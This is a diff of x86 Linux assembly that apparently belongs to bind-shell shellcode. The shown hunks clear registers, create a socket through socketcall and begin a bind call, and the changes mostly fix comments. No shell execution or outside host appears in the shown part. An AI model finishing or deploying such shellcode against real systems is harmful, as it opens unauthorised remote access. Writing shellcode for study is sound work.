@@ -12,16 +12,20 @@ global _start
 section .text
 _start:
 
+	xor eax, eax ; cleaning registers for sanity
+        xor ebx, ebx
+        xor edx, edx
+        xor edi, edi
+
 	; 1 - create socket
 	; socket(AF_INET, SOCK_STREAM, 0);
 	; #define SYS_SOCKET      1               /* sys_socket(2) */
-
-	xor eax, eax ; null aex
-	push eax
+	
+	push eax ; null
 	mov al, 0x66 ; sys_socketcall = 102
 	mov bl, 0x1 ; socketcall() socket = 1
-	push byte 0x1 ; stack = 1
-	push byte 0x2 ; stack = 1, 2 (0, SOCK_STREAM, AF_INET)
+	push byte 0x1 ; stack = 0, 1
+	push byte 0x2 ; stack = 0, 1, 2 (0, SOCK_STREAM, AF_INET)
 	mov ecx, esp ; mov stack ptr to ecx
 	int 0x80 ; init
 
@@ -29,7 +33,7 @@ _start:
  	; bind(fd, (struct sockaddr *) &s_addr, 16);
  	; #define SYS_BIND        2               /* sys_bind(2) */
 
-	xchg edi, eax ; transfer fd to esi 
+	xchg edi, eax ; transfer fd to edi 
  	mov al, 0x66 ; sys_socketcall = 102
  	pop ebx ; sys_bind = 2
  	pop esi  ; = 1
